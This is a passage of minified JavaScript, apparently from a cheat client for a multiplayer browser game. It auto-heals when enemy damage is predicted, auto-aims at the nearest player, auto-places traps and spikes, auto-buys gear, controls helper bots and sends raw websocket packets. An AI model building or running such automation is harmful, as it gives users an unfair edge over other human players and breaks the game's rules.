      } else if ("windmill" == cS.name || "faster windmill" == cS.name || "power mill" == cS.name) cb.fillStyle = "#a5974c", TL(0, 0, cS.scale, cb), cb.fillStyle = "#c9b758", TU(0, 0, 1.5 * cS.scale, 29, 4, cb), cb.fillStyle = "#a5974c", TL(0, 0, 0.5 * cS.scale, cb); else if ("mine" == cS.name) cb.fillStyle = "#939393", Ts(cb, 3, cS.scale, cS.scale), cb.fill(), cb.stroke(), cb.fillStyle = "#bcbcbc", Ts(cb, 3, 0.55 * cS.scale, 0.65 * cS.scale), cb.fill(); else if ("sapling" == cS.name) for (cQ = 0; cQ < 2; ++cQ) Ts(cb, 7, co = cS.scale * (cQ ? 0.5 : 1), 0.7 * co), cb.fillStyle = cQ ? "#b4db62" : "#9ebf57", cb.fill(), cQ || cb.stroke(); else if ("pit trap" == cS.name) cb.fillStyle = "#a5974c", Ts(cb, 3, 1.1 * cS.scale, 1.1 * cS.scale), cb.fill(), cb.stroke(), cb.fillStyle = Vo, Ts(cb, 3, 0.65 * cS.scale, 0.65 * cS.scale), cb.fill(); else if ("boost pad" == cS.name) cb.fillStyle = "#7e7f82", Tp(0, 0, 2 * cS.scale, 2 * cS.scale, cb), cb.fill(), cb.stroke(), cb.fillStyle = "#dbd97d", function (cB, cj) {
        cj = cj || VL;
        var cC = cB * (Math.sqrt(3) / 2);
        cj.beginPath(), cj.moveTo(0, -cC / 2), cj.lineTo(-cB / 2, cC / 2), cj.lineTo(cB / 2, cC / 2), cj.lineTo(0, -cC / 2), cj.fill(), cj.closePath();
      }(1 * cS.scale, cb); else if ("turret" == cS.name) cb.fillStyle = "#a5974c", TL(0, 0, cS.scale, cb), cb.fill(), cb.stroke(), cb.fillStyle = "#939393", Tp(0, -25, 0.9 * cS.scale, 50, cb), TL(0, 0, 0.6 * cS.scale, cb), cb.fill(), cb.stroke(); else if ("platform" == cS.name) {
        cb.fillStyle = "#cebd5f";
        var cD = 2 * cS.scale, cW = cD / 4, cm = -cS.scale / 2;
        for (cQ = 0; cQ < 4; ++cQ) Tp(cm - cW / 2, 0, cW, 2 * cS.scale, cb), cb.fill(), cb.stroke(), cm += cD / 4;
      } else "healing pad" == cS.name ? (cb.fillStyle = "#7e7f82", Tp(0, 0, 2 * cS.scale, 2 * cS.scale, cb), cb.fill(), cb.stroke(), cb.fillStyle = "#db6e6e", TU(0, 0, 0.65 * cS.scale, 20, 4, cb, !0)) : "spawn pad" == cS.name ? (cb.fillStyle = "#7e7f82", Tp(0, 0, 2 * cS.scale, 2 * cS.scale, cb), cb.fill(), cb.stroke(), cb.fillStyle = "#71aad6", TL(0, 0, 0.6 * cS.scale, cb)) : "blocker" == cS.name ? (cb.fillStyle = "#7e7f82", TL(0, 0, cS.scale, cb), cb.fill(), cb.stroke(), cb.rotate(Math.PI / 4), cb.fillStyle = "#db6e6e", TU(0, 0, 0.65 * cS.scale, 20, 4, cb, !0)) : "teleporter" == cS.name && (cb.fillStyle = "#7e7f82", TL(0, 0, cS.scale, cb), cb.fill(), cb.stroke(), cb.rotate(Math.PI / 4), cb.fillStyle = "#d76edb", TL(0, 0, 0.5 * cS.scale, cb, !0));
      if (!cf) {
        cb.globalAlpha = 0.6;
        cb.fillStyle = yI && cS.owner && cS.owner.sid == yI.sid ? "" : cS.owner && yI && yI.team && isAlly(cS.owner.sid) ? "" : "#780c0c";
        if (yI && cS.owner && cS.owner.sid == yI.sid) {} else if (cS.owner && yI && yI.team && isAlly(cS.owner.sid)) {} else {
          if (cS.name.includes("spike") || cS.name.includes("pit trap")) {
            if (cS.name.includes("spike")) {
              cb.globalAlpha = 0.6;
            } else {
              cb.globalAlpha = 1;
            }
            cb.fill();
          }
        }
      }
      cA = cY;
      if (!cf) {
        TT[cS.id + (yI && cS.owner && cS.owner.sid == yI.sid ? 0 : yI && yI.team && cS.owner && isAlly(cS.owner.sid) ? 25 : 50)] = cA;
      }
    }
    return cA;
  }
  function TL(cS, cf, cA, cY, cb, cu) {
    (cY = cY || VL).beginPath(), cY.arc(cS, cf, cA, 0, 2 * Math.PI), cu || cY.fill(), cb || cY.stroke();
  }
  function Ts(cS, cf, cA, cY, cb) {
    var cu, cx, cQ = Math.PI / 2 * 3, ck = Math.PI / cf;
    cS.beginPath(), cS.moveTo(0, -cA);
    if (cb) cS.rotate(Math.PI / 2);
    for (var cl = 0; cl < cf; cl++) cu = Math.cos(cQ) * cA, cx = Math.sin(cQ) * cA, cS.lineTo(cu, cx), cQ += ck, cu = Math.cos(cQ) * cY, cx = Math.sin(cQ) * cY, cS.lineTo(cu, cx), cQ += ck;
    cS.lineTo(0, -cA), cS.closePath();
  }
  function Tp(cS, cf, cA, cY, cb, cu) {
    cb.fillRect(cS - cA / 2, cf - cY / 2, cA, cY), cu || cb.strokeRect(cS - cA / 2, cf - cY / 2, cA, cY);
  }
  function TU(cS, cf, cA, cY, cb, cu, cx) {
    cu.save(), cu.translate(cS, cf), cb = Math.ceil(cb / 2);
    for (var cQ = 0; cQ < cb; cQ++) Tp(0, 0, 2 * cA, cY, cu, cx), cu.rotate(Math.PI / cb);
    cu.restore();
  }
  function TG(cS, cf, cA) {
    if (cS == 15 && Math.hypot(cA - yI.y2, cf - yI.x2) <= 80) {
      let cY = Math.atan2(cA - yI.y2, cf - yI.x2) + c1(180);
      TR(yI.items[2], Math.hypot(cf - yI.x, cA - cA));
      for (let cb = cY; cb < Math.PI * 2 + cY; cb += Math.PI / 12 + cY) {
        TR(yI.items[4], cb);
      }
      for (let cu = cY; cu < Math.PI * 2 + cY; cu += Math.PI / 12 + cY) {
        TR(yI.items[3], -cu);
      }
    }
  }
  function Tq(cS) {
    for (var cf = 0; cf < cS.length;) {
      if (cS[cf + 7] && cS[cf + 7] != yI.sid && !isAlly(cS[cf + 7])) {
        TG(cS[cf + 6], cS[cf + 1], cS[cf + 2]);
      }
      Va.add(cS[cf], cS[cf + 1], cS[cf + 2], cS[cf + 3], cS[cf + 4], cS[cf + 5], y9.list[cS[cf + 6]], !0, cS[cf + 7] >= 0 ? {sid: cS[cf + 7]} : null);
      cf += 8;
    }
  }
  function TP(cS, cf) {
    let cA;
    (cA = cZ(cf)) && (cA.xWiggle += y7.gatherWiggle * Math.cos(cS), cA.yWiggle += y7.gatherWiggle * Math.sin(cS), Jm().then(function (cY) {
      cA.currentHealth -= cY;
      if (cA.currentHealth < 0) {
        Jv(cA.sid);
      }
    }).catch(function (cY) {
      JD = [];
    }));
  }
  function Tg(cS, cf) {
    (yK = cZ(cS)) && (yK.dir = cf, yK.xWiggle += y7.gatherWiggle * Math.cos(cf + Math.PI), yK.yWiggle += y7.gatherWiggle * Math.sin(cf + Math.PI));
  }
  var TH = ![], TN = [];
  function Th(cS, cf) {
    if (yI.sid != cS && !isAlly(cS)) {
      let cA = cX(cS);
      if (typeof TN[cS] == "object") {
        TN[cS].push(cf);
      } else {
        TN[cS] = [cf];
      }
      if (ch(cA, yI) < 260 && (cA.primary.id == 4 || cA.primary.id == 5) && cA.primary.variant > 1 && cA.primary.reload == 1) {
        TH = !![];
        setTimeout(() => {
          TH = ![];
        }, 400);
      }
      let cY = 0;
      for (let cb = 0; cb < TN[cS].length; cb++) {
        cY += TN[cS][cb];
      }
      if (yI.health - cY <= 0 && yI.shameCount < 5) {
        console.log("do bullet healing");
      }
      setTimeout(() => {
        TN[cS].shift();
      }, 500);
    }
  }
  function TX(cS, cf, cA, cY, cb, cu, cx, cQ) {
    Vj && (yl.addProjectile(cS, cf, cA, cY, cb, cu, null, null, cx).sid = cQ, function (ck, cl, ca, co, cD) {
      let cW = Infinity, cm = {};
      for (let cB = 0; cB < yu.length; cB++) (yK = yu[cB]) && yK.visible && yK.secondary.id && void 0 !== y9.weapons[yK.secondary.id].projectile && y9.projectiles[y9.weapons[yK.secondary.id].projectile].speed == cD && cW > (1.5 * yK.x2 - yK.x1 / 2 - ck + 80 * Math.cos(ca)) ** 2 + (1.5 * yK.y2 - yK.y1 / 2 - cl + 80 * Math.sin(ca)) ** 2 && (cm = yK, cW = (1.5 * yK.x2 - yK.x1 / 2 - ck + 80 * Math.cos(ca)) ** 2 + (1.5 * yK.y2 - yK.y1 / 2 - cl + 80 * Math.sin(ca)) ** 2);
      if (Math.sqrt(cW) > 60) {
        if (1.5 == cD) {
          for (let cj = 0; cj < yu.length; cj++) (yK = yu[cj]) && yK.visible && cW > (1.5 * yK.x2 - yK.x1 / 2 - ck + 10 * Math.cos(ca)) ** 2 + (1.5 * yK.y2 - yK.y1 / 2 - cl + 10 * Math.sin(ca)) ** 2 && (cm = yK, cW = (1.5 * yK.x2 - yK.x1 / 2 - ck + 10 * Math.cos(ca)) ** 2 + (1.5 * yK.y2 - yK.y1 / 2 - cl + 10 * Math.sin(ca)) ** 2);
          60 > Math.sqrt(cW) && (Th(cm.sid, 25), cm.turret = -0.0444);
        } else 20 == cm.skinIndex && (cm.secondary.fastReload = !![]), Th(cm.sid, cm.secondary.dmg), setTimeout(() => {
          cm.secondary.reload = -111 / y9.weapons[cm.secondary.id].speed;
        });
      } else 20 == cm.skinIndex && (cm.secondary.fastReload = !![]), Th(cm.sid, 50), cm.secondary.reload = -111 / y9.weapons[15].speed;
    }(cS, cf, cA, cY, cb));
  }
  function TF(cS, cf) {
    for (var cA = 0; cA < yk.length; ++cA) yk[cA].sid == cS && (yk[cA].range = cf);
  }
  function TZ(cS) {
    (yK = cF(cS)) && yK.startAnim();
  }
  function Tz(cS) {
    for (var cf = 0; cf < yb.length; ++cf) yb[cf].forcePos = !yb[cf].visible, yb[cf].visible = !1;
    if (cS) {
      var cA = Date.now();
      for (cf = 0; cf < cS.length;) (yK = cF(cS[cf])) ? (yK.index = cS[cf + 1], yK.t1 = void 0 === yK.t2 ? cA : yK.t2, yK.t2 = cA, yK.x1 = yK.x, yK.y1 = yK.y, yK.x2 = cS[cf + 2], yK.y2 = cS[cf + 3], yK.d1 = void 0 === yK.d2 ? cS[cf + 4] : yK.d2, yK.d2 = cS[cf + 4], yK.health = cS[cf + 5], yK.dt = 0, yK.visible = !0) : ((yK = yD.spawn(cS[cf + 2], cS[cf + 3], cS[cf + 4], cS[cf + 1])).x2 = yK.x, yK.y2 = yK.y, yK.d2 = yK.dir, yK.health = cS[cf + 5], yD.aiTypes[cS[cf + 1]].name || (yK.name = y7.cowNames[cS[cf + 6]]), yK.forcePos = !0, yK.sid = cS[cf], yK.visible = !0), cf += 7;
    }
  }
  var TO = {};
  function TE(cS, cf) {
    var cA = cS.index, cY = TO[cA];
    if (!cY) {
      var cb = new Image;
      cb.onload = function () {
        this.isLoaded = !0, this.onload = null;
      }, cb.src = ".././img/animals/" + cS.src + ".png", cY = cb, TO[cA] = cY;
    }
    if (cY.isLoaded) {
      var cu = 1.2 * cS.scale * (cS.spriteMlt || 1);
      cf.drawImage(cY, -cu, -cu, 2 * cu, 2 * cu);
    }
  }
  function TI(cS, cf, cA) {
    return cS + cA >= 0 && cS - cA <= V2 && cf + cA >= 0 && cf - cA <= V3;
  }
  function TM(cS, cf) {
    var cA = function (cY) {
      for (var cb = 0; cb < yu.length; ++cb) if (yu[cb].id == cY) return yu[cb];
      return null;
    }(cS[0]);
    cA || (cA = new yV(cS[0], cS[1], y7, y5, yl, Va, yu, yb, y9, Vk, Vl), yu.push(cA)), cA.spawn(cf ? yf : null), cA.visible = !1, cA.x2 = void 0, cA.y2 = void 0, cA.setData(cS), cf && (yr = (yI = cA).x, yw = yI.y, dk(), JS(), Ju(), Jb(0), VN.style.display = "block");
  }
  function TK(cS) {
    for (var cf = 0; cf < yu.length; cf++) if (yu[cf].id == cS) {
      yu.splice(cf, 1);
      break;
    }
  }
  function Tr(cS, cf) {
    if (yI) {
      yI.itemCounts[cS] = cf;
    }
  }
  function Tw(cS, cf, cA) {
    yI && (yI[cS] = cf, cA && JS());
  }
  function TR(cS, cf = Math.atan2(yj - yS / 2, yB - yv / 2)) {
    JE(cS);
    y4.send("c", 1, cf);
    y4.send("c", 0, cf);
    JE(dY.status == !![] ? yI.weapons[1] : dA.status == !![] ? yI.weapons[0] : yI.weaponIndex, !![]);
  }
  function Tv() {
    for (let cS = 0; cS < 4; cS++) {
      TR(yI.items[0]);
    }
  }
  window.secondaryDmg = function (cS) {
    if (cS == 15) {
      return 50;
    } else if (cS == 9) {
      return 25;
    } else if (cS == 12) {
      return 35;
    } else if (cS == 13) {
      return 30;
    } else {
      return 0;
    }
  };
  window.variantMulti = function (cS) {
    if (cS == 1) {
      return 1.1;
    } else if (cS == 2 || cS == 3) {
      return 1.18;
    } else {
      return 1;
    }
  };
  var TS = [];
  var Tf = 0;
  function TA(cS) {
    if (yI.skinIndex == 6) {
      if (cS == 75) {
        return 57;
      } else {
        return Math.round(cS * 0.75);
      }
    } else {
      return Math.round(cS);
    }
  }
  function TY(cS, cf) {
    if (cS.length > 1) return "sync";
    for (let cA = 0; cA < cS.length; cA++) {
      let cY = cX(cS[cA]);
      if (cf == TA(cY.primary.dmg * 1.5)) {
        return [TA(cY.primary.dmg * 1.5), !![]];
      } else if (cf == TA(cY.primary.dmg)) {
        return [TA(cY.primary.dmg), !![]];
      } else if (cf == TA(cY.primary.dmg * 1.2)) {
        return [TA(cY.primary.dmg * 1.2), !![]];
      }
      if (cf == TA(cY.secondary.dmg)) {
        console.log("secondary damage");
        return [TA(cY.secondary.dmg), ![]];
      } else if (cf == TA(cY.secondary.dmg + 25)) {
        console.log("secondary + turret damage");
        return [TA(cY.secondary.dmg + 25), ![]];
      } else if (cf == TA(cY.secondary.dmg * 1.5)) {
        console.log("secondary damage x1.5");
        return [TA(cY.secondary.dmg * 1.5), ![]];
      } else if (cf == TA(25)) {
        console.log("turret damage");
        return [TA(25), ![]];
      }
    }
    return "unknown";
  }
  function Tb() {
    let cS = [], cf = 0;
    for (let cA = 0; cA < TS.length; cA++) {
      let cY = TS[cA];
      let cb = 0;
      if (cY.primary.reload > 0.7) {
        cb += Math.round(cY.primary.dmg * 1.5);
      }
      if (cY.secondary.reload > 0.7) {
        cb += cY.secondary.dmg;
      }
      if (cY.turret > 0.7) {
        cb += 25;
      }
      cf += cb;
      cS.push(cY.sid);
    }
    return [cS, cf];
  }
  function Tu(cS) {
    if (TB.length) {
      if ((yI.health == 43 || yI.health == 25) && yI.shameCount < 5) {
        console.log("reverse");
        Tv();
      } else if ((cS == 10 || cS == 11 || cS == 12) && dS == ![]) {
        dv = !![];
        db(6);
        setTimeout(() => {
          Tv();
          dv = ![];
        }, 222);
      } else {
        setTimeout(() => {
          Tv();
        }, 100);
      }
    } else {
      setTimeout(() => {
        Tv();
      }, 100);
    }
  }
  var Tx = [], TQ = ![];
  function Tk(cS) {
    let cf = Tb();
    if (cf[1] >= 100) {
      let cA = TY(cf[0], cS);
      if (cA == "sync" || cA == "unknown") {
        if (yI.shameCount < 5 && cS >= 10) {
          Tv();
        } else {
          setTimeout(() => {
            Tv();
          }, 100);
        }
      } else {
        let cY = yI.health - cS;
        let cb = cf[1] - cA[0];
        if (cA[1] && cY - cb + 25 > 1 && dv == ![] && TH == ![] && TQ == ![]) {
          dS = !![];
          db(22);
          setTimeout(() => {
            Tv();
            dS = ![];
          }, 222);
        } else if (cY - Math.round(cb * 0.75) > 1) {
          dv = !![];
          db(6);
          setTimeout(() => {
            Tv();
            dv = ![];
          }, 222);
        } else {
          if (yI.shameCount < 5) {
            Tv();
          } else {
            setTimeout(() => {
              Tv();
            }, 100);
          }
        }
      }
    } else {
      Tu(cS);
    }
  }
  function Tl(cS, cf) {
    if (yK = cX(cS)) {
      let cA = cf - yK.health;
      if (cA >= 0) {
        if (tick - yK.tracker.heal.lastChange < 3) {
          if (tick - yK.tracker.heal.lastChange <= 1 && yK.shameCount > yK.tracker.heal.tick) {
            yK.tracker.heal.tick = yK.shameCount;
          }
        }
        if (cA == 3 && yK.tailIndex == 13) {
          yK.bullTick = tick;
        } else if (cA == 6 && yK.tailIndex == 13 && yK.skinIndex == 13) {
          yK.bullTick = tick;
        } else if (cA == 1 && yK.tailIndex == 17) {
          yK.bullTick = tick;
        } else {
          yK.buildItem();
        }
      } else {
        yK.hitTime = tick;
        if (cA <= -40) {
          yK.tracker.heal.lastChange = tick;
        }
        if (cA == -2 && yK.skinIndex == 7 && yK.tailIndex == 13) {
          yK.bullTick = tick;
          if (yK == yI) {
            Tf = 0;
          }
        } else if (cA == -5) {
          yK.bullTick = tick;
          if (yK == yI) {
            Tf = 0;
          }
        }
        if (yK == yI) {
          Tx.push(Math.abs(cA));
          Tk(Math.abs(cA));
        }
      }
      yK.health = cf;
    }
  }
  var Ta = ![];
  setInterval(() => {
    if (Ta == !![]) {
      y4.send("2", Tj);
      y4.send("2", Tj);
    }
  }, -1);
  window.isAlly = function (cS) {
    return dp.includes(cS);
  };
  var To = {last: ![], health: 700, location: {x: 0, y: 0}}, TD = ![];
  var TW = {aiming: ![], interval: null, type: function (cS) {
    if (cS == "back") {
      this.aiming = "back";
      clearInterval(this.interval);
      this.interval = setInterval(() => {
        y4.send("2", Tj + Math.PI);
        y4.send("2", Tj + Math.PI);
      }, 0);
    } else if (cS == "normal") {
      this.aiming = "normal";
      clearInterval(this.interval);
      this.interval = setInterval(() => {
        y4.send("2", Tj);
        y4.send("2", Tj);
      }, 0);
    } else {
      clearInterval(this.interval);
      this.aiming = ![];
    }
  }};
  function Tm(cS) {
    Jz = ![];
    if (yI.weapons[0] == 7 && yI.weapons[1] == 10 && document.getElementById("dhkm").checked) {
      y4.send("6", 4);
      y4.send("6", 15);
      yI.secondary.reload = 0;
    }
    if (cS == 3) {
      Jq = ![];
      JP = !![];
      TW.type("back");
      y4.send("33", Tj);
      y4.send("33", Tj);
      db(53);
      db(11, 1);
      JE(yI.weapons[1], !![]);
      dA.change(![]);
      dY.change(!![]);
      if (yI.weapons[0] == 4 && yI.weapons[1] && yI.weapons[1] == 15) {
        y4.send("2", Tj + c1(180));
        y4.send("c", 1, Tj + c1(180));
        y4.send("c", 0, Tj + c1(180));
      }
      setTimeout(() => {
        TW.type("normal");
        y4.send("2", Tj);
        df.change(!![]);
        JE(yI.weapons[0], !![]);
        dY.change(![]);
        dA.change(!![]);
        db(7);
        db(yI.tails[21] ? 21 : 0, 1);
        setTimeout(() => {
          TW.type("");
          JP = ![];
          df.change(![]);
          dA.change(![]);
          dY.change(![]);
        }, 222);
      }, 111);
    } else if (cS == 2) {
      if (document.getElementById("sope").checked && cT == !![]) {
        y4.send("33", null);
      }
      Ta = !![];
      db(yI.tails[21] ? 21 : 0, 1);
      JE(yI.weapons[1], !![]);
      dY.change(!![]);
      dA.change(![]);
      db(53);
      df.change(!![]);
      if (document.getElementById("sope").checked && cT == !![]) {
        setTimeout(() => {
          db(yI.tails[21] ? 21 : 0, 1);
          dY.change(![]);
          JE(yI.weapons[0], !![]);
          db(7);
          dA.change(!![]);
          setTimeout(() => {
            websocket.send(new Uint8Array([135, 102, 37, 116, 94, 162, 44, 210, 28, 223, 1, 13, 113, 180]));
            setTimeout(() => {
              Ta = ![];
              df.change(![]);
              dA.change(![]);
              dY.change(![]);
            }, 150);
          }, 100);
        }, 100);
      } else {
        setTimeout(() => {
          db(yI.tails[21] ? 21 : 0, 1);
          dY.change(![]);
          JE(yI.weapons[0], !![]);
          db(7);
          dA.change(!![]);
          setTimeout(() => {
            Ta = ![];
            df.change(![]);
            dA.change(![]);
            dY.change(![]);
          }, 185);
        }, 85);
      }
    } else if (cS == 1) {
      if (document.getElementById("sope").checked && cT == !![]) {
        y4.send("33", null);
      }
      Ta = !![];
      db(yI.tails[13] ? 13 : 0, 1);
      JE(yI.weapons[0], !![]);
      dA.change(!![]);
      dY.change(![]);
      db(6);
      df.change(!![]);
      if (document.getElementById("sope").checked && cT == !![]) {
        setTimeout(() => {
          db(nearestEnemy[9] == 6 || nearestEnemy[9] == 22 ? 20 : 53);
          db(11, 1);
          JE(yI.weapons[1], !![]);
          dY.change(!![]);
          dA.change(![]);
          websocket.send(new Uint8Array([135, 102, 37, 116, 94, 162, 44, 210, 28, 223, 1, 13, 113, 180]));
          setTimeout(() => {
            Ta = ![];
            df.change(![]);
            dA.change(![]);
            dY.change(![]);
          }, 250);
        }, 100);
      } else {
        setTimeout(() => {
          db(nearestEnemy[9] == 6 || nearestEnemy[9] == 22 ? 20 : 53);
          db(11, 1);
          JE(yI.weapons[1], !![]);
          dY.change(!![]);
          dA.change(![]);
          setTimeout(() => {
            Ta = ![];
            df.change(![]);
            dA.change(![]);
            dY.change(![]);
          }, 185);
        }, 85);
      }
    } else {
      if (document.getElementById("sope").checked && cT == !![]) {
        y4.send("33", null);
      }
      Ta = !![];
      db(yI.tails[21] ? 21 : 0, 1);
      JE(yI.weapons[0], !![]);
      dA.change(!![]);
      dY.change(![]);
      db(7);
      df.change(!![]);
      if (document.getElementById("sope").checked && cT == !![]) {
        setTimeout(() => {
          db(nearestEnemy[9] == 22 ? 20 : 53);
          db(11, 1);
          JE(yI.weapons[1], !![]);
          dY.change(!![]);
          dA.change(![]);
          websocket.send(new Uint8Array([135, 102, 37, 116, 94, 162, 44, 210, 28, 223, 1, 13, 113, 180]));
          setTimeout(() => {
            Ta = ![];
            df.change(![]);
            dA.change(![]);
            dY.change(![]);
          }, 250);
        }, 100);
      } else {
        setTimeout(() => {
          db(nearestEnemy[9] == 22 ? 20 : 53);
          db(11, 1);
          JE(yI.weapons[1], !![]);
          dY.change(!![]);
          dA.change(![]);
          setTimeout(() => {
            Ta = ![];
            df.change(![]);
            dA.change(![]);
            dY.change(![]);
          }, 185);
        }, 85);
      }
    }
  }
  var TB = [], Tj = 0, TC = 0, c0 = "none";
  function c1(cS) {
    return cS / 180 * Math.PI;
  }
  var c2 = [[11, ![]], [15, !![]], [6, !![]], [7, !![]], [22, !![]], [40, !![]], [53, !![]], [31, !![]], [12, !![]], [11, !![]], [26, !![]], [21, ![]], [20, !![]]];
  var c3 = setInterval(() => {
    if (c2[0][1] == !![]) {
      Vk.filter(cS => cS.id == c2[0][0]).forEach(cS => {
        if (yI && yI.points >= cS.price) {
          du(cS.id, 0);
          c2.shift();
        }
      });
    } else if (c2[0][1] == ![]) {
      Vl.filter(cS => cS.id == c2[0][0]).forEach(cS => {
        if (yI && yI.points >= cS.price) {
          du(cS.id, 1);
          c2.shift();
        }
      });
    }
    if (c2.length == 0) {
      clearInterval(c3);
    }
  }, 500);
  function c4(cS, cf) {
    let cA = y9.list[cS];
    let cY = 35 + cA.scale + (cA.placeOffset || 0);
    if (Va.checkItemLocation(yI.x2 + Math.cos(cf) * cY, yI.y2 + Math.sin(cf) * cY, cA.scale, 0.6, y2.id, ![])) {
      TR(cS, cf);
    }
  }
  const c5 = {interval: null, action: function (cS) {
    if (cS == !![]) {
      clearInterval(this.interval);
      this.interval = setInterval(() => {
        if (Ta == ![] && TD == ![]) {
          c0 = "autogrind";
          JE(yI.weaponIndex, !![]);
          if (yI.weaponIndex > 9 ? yI.secondary.reload == 1 : yI.primary.reload == 1) {
            y4.send("c", 1, Number.MAX_VALUE);
            y4.send("c", 0, Number.MAX_VALUE);
            db(40);
          } else {
            db(6);
          }
          y4.send("2", Number.MAX_VALUE);
        }
      }, 0);
    } else {
      clearInterval(this.interval);
    }
  }};
  document.getElementById("autogrind").addEventListener("change", function () {
    if (document.getElementById("autogrind").checked == !![]) {
      for (let cS = 0; cS < 4; cS++) {
        TR(yI.items[5] ? yI.items[5] : yI.items[3], c1(90 * cS));
      }
    }
    c5.action(document.getElementById("autogrind").checked);
  });
  var c6 = ![], c7 = 0, c8 = 0, c9 = {amount: [], info: []}, cy = [];
  function cV() {
    if (!nearestEnemy.length || Js.status) return;
    let cS = yQ.find(cf => cf.trap && (cf.owner.sid == yI.sid || isAlly(cf.owner.sid)) && Math.hypot(cf.y - nearestEnemy[2], cf.x - nearestEnemy[1]) < 70);
    if (cS) {
      if (cN(nearestEnemy, yI) < 200) {
        c4(yI.items[2], Tj);
        for (let cf = 0; cf < Math.PI * 2; cf += Math.PI / 12) {
          c4(yI.items[2], cf + Tj);
          c4(yI.items[2], cf - Tj);
        }
      }
    } else {
      c4(yI.items[4], Tj);
    }
    if (cN(nearestEnemy, yI) < 250) {
      c4(yI.items[2], Tj);
      for (let cA = Tj - Math.PI / 3; cA < Tj + Math.PI / 3; cA += Math.PI / 18) {
        c4(yI.items[2], cA);
      }
      for (let cY = 0; cY < Math.PI * 2; cY += Math.PI / 12) {
        c4(yI.items[4], cY);
      }
    } else {
      for (let cb = 0; cb < Math.PI * 2; cb += Math.PI / 12) {
        c4(yI.items[4], cb);
      }
    }
    y4.send("2", J9());
  }
  function cd(cS, cf) {
    if (cS == "clan") {
      for (let cA = 0; cA < modBots.length; cA++) {
        if (modBots[cA].readyState == 1 && modBots[cA].clan != cf) {
          modBots[cA].emit(["9"]);
          modBots[cA].emit(["10", [cf]]);
        }
      }
    }
  }
  var cJ = 0, cT = ![];
  var cc = [];
  function cL() {
    let cS = yQ.find(cf => cf.trap && nearestEnemy.length && (cf.owner.sid == yI.sid || isAlly(cf.owner.sid)) && Math.hypot(cf.y - nearestEnemy[2], cf.x - nearestEnemy[1]) < 70);
    cT = ![];
    if (nearestEnemy.length && c8 == c7) {
      cT = !![];
    } else if (cS) {
      cT = !![];
    }
  }
  function cs(cS) {
    tick++;
    TB = [];
    nearestEnemy = [];
    Tj = 0;
    cc = TS;
    TS = [];
    var cf = Date.now();
    for (var cA = 0; cA < yu.length; cA++) {
      yu[cA].forcePos = !yu[cA].visible;
      yu[cA].visible = ![];
    }
    for (cA = 0; cA < cS.length;) {
      yK = cX(cS[cA]);
      if (yK) {
        yK.t1 = void 0 === yK.t2 ? cf : yK.t2;
        yK.t2 = cf;
        yK.x1 = yK.x;
        yK.y1 = yK.y;
        yK.x2 = cS[cA + 1];
        yK.y2 = cS[cA + 2];
        yK.d1 = void 0 === yK.d2 ? cS[cA + 3] : yK.d2;
        yK.d2 = cS[cA + 3];
        yK.dt = 0;
        yK.speed = Math.hypot(yK.y1 - yK.y2, yK.x1 - yK.x2);
        yK.buildIndex = cS[cA + 4];
        yK.weaponIndex = cS[cA + 5];
        yK.weaponVariant = cS[cA + 6];
        yK.team = cS[cA + 7];
        yK.isLeader = cS[cA + 8];
        yK.skinIndex = cS[cA + 9];
        yK.tailIndex = cS[cA + 10];
        yK.iconIndex = cS[cA + 11];
        yK.zIndex = cS[cA + 12];
        yK.visible = !0;
        yK.update();
        if (!(yK == yI || yK.team && yK.team == yI.team)) {
          TB.push(cS.slice(cA, cA + 13));
        }
        if (yK == yI) {
          myPlayer = {x: yI.x2, y: yI.y2};
          if (yI.team) {
            cd("clan", yI.team);
          }
          if (yI.weapons[0] && yI.primary.id != yI.weapons[0]) {
            yI.primary.id = yI.primary.reloadid = yI.weapons[0];
          } else if (yI.weapons[1] && yI.secondary.id != yI.weapons[1]) {
            yI.secondary.id = yI.secondary.reloadid = yI.weapons[1];
          }
        }
      }
      cA += 13;
    }
    if (Js.status) {
      Js.w || !Js.a || Js.s || Js.d ? !Js.w && Js.a && Js.s && !Js.d ? Js.aim = -0.77 : Js.w || Js.a || !Js.s || Js.d ? !Js.w && !Js.a && Js.s && Js.d ? Js.aim = -2.34 : Js.w || Js.a || Js.s || !Js.d ? Js.w && !Js.a && !Js.s && Js.d ? Js.aim = 2.35 : !Js.w || Js.a || Js.s || Js.d ? Js.w && Js.a && !Js.s && !Js.d && (Js.aim = 0.77) : Js.aim = 1.57 : Js.aim = 3.14 : Js.aim = -1.57 : Js.aim = 0;
    }
    if (Math.sqrt(Math.pow(Js.y - yI.y, 2) + Math.pow(Js.x - yI.x, 2)) > 99) {
      if (Js.status) {
        TR(yI.items[3], Js.aim);
        TR(yI.items[3], Js.aim - c1(69));
        TR(yI.items[3], Js.aim + c1(69));
        if (document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) {
          y4.send("2", Js.aim);
        } else {
          y4.send("2", J9());
        }
      }
      Js.x = yI.x;
      Js.y = yI.y;
    }
    if (TB.length) {
      TB = TB.sort((cu, cx) => cN(cu, yI) - cN(cx, yI));
      nearestEnemy = TB[0];
      for (let cu = 0; cu < TB.length; cu++) {
        let cx = cX(TB[cu][0]);
        if (ch(cx, yI) / 1.7 <= y9.weapons[cx.primary.id].range + 35) {
          TS.push(cx);
        }
      }
    }
    for (let cQ = 0; cQ < cc.length; cQ++) {
      if (!TB.find(ck => ck[0] == cc[cQ][0])) {
        let ck = cX(cc[cQ][0]);
        if (ck) {
          ck.primary.reload = 1;
          ck.secondary.reload = 1;
          ck.turret = 1;
        }
      }
    }
    if (nearestEnemy.length) {
      Tj = Math.atan2(nearestEnemy[2] - yI.y2, nearestEnemy[1] - yI.x2);
    } else {
      Tj = 0;
    }
    if (document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) {
      if (yI.secondary.reload < 1) {
        yI.lockDir = 0;
      } else {
        yI.lockDir = 1;
      }
      if (Date.now() - cJ >= 5e3) {
        J0 = Math.floor(Math.random() * 360);
        cJ = Date.now();
      }
    } else {
      yI.lockDir = 0;
    }
    if (nearestEnemy.length) {
      c7 = c8;
      c8 = cN(nearestEnemy, yI);
    }
    cL();
    if (yI.skins[11] && yI.tails[21] && nearestEnemy.length) {
      c9.amount = [];
      for (let cl = 0; cl < c9.info.length; cl++) {
        if (c9.info[cl] && c9.info[cl].primary.reload == 1) {
          if (TB.find(ca => c9.info[cl].sid == ca[0])) {
            c9.amount.push(!![]);
          }
        }
      }
      c9.info = [];
      for (let ca = 0; ca < TS.length; ca++) {
